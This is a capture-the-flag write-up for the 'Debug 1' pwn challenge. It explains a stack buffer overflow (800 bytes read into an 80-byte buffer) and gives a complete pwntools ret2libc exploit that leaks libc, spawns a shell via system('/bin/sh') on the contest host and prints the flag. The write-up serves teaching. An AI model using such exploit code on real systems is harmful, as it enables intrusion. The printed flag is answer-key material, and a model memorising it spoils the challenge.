https://ctftime.org/event/2681

# Debug 1 (pwn)

Author: FlamePyromancer

I made a program which inverts the capitalization of letters! Surely there's nothing insecure with the program, right?

## Analysis

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

We can see the following code in `debug` gives us a `libc.so.6` leak and lets us control a lot of the stack:

```c
printf("libc leak: %lx\n", system);

puts("Leave a message here (max: 80 characters)!");
char message[80];

read(0, message, 800);
```

## Solution

1) Leak address from `libc.so.6` to bypass ASLR by returning into `debug`
2) ret2libc

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./debug-1_patched", checksec=False)
context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

p.sendlineafter(b"3: Exit\n\n", str(1).encode())

payload = b""
payload += b"A" * 0x58
payload += p64(elf.sym["debug"]+1)
p.sendlineafter(b"characters):\n\n", payload)

p.sendlineafter(b"well :) )\n", str(1).encode())

p.readuntil(b"libc leak: ")
leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["system"]

rop = ROP(libc)
rop.raw(b"A" * 0x68)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendline(rop.chain())

p.sendline(b"/bin/cat flag.txt")
p.readuntil(b"gigem{")
print("gigem{" + p.readuntil(b"}").decode()) # gigem{d3bUg61ng_n3w_c0d3_a24dcfe3}
```

## Flag
`gigem{d3bUg61ng_n3w_c0d3_a24dcfe3}`

smiley 2025/03/29
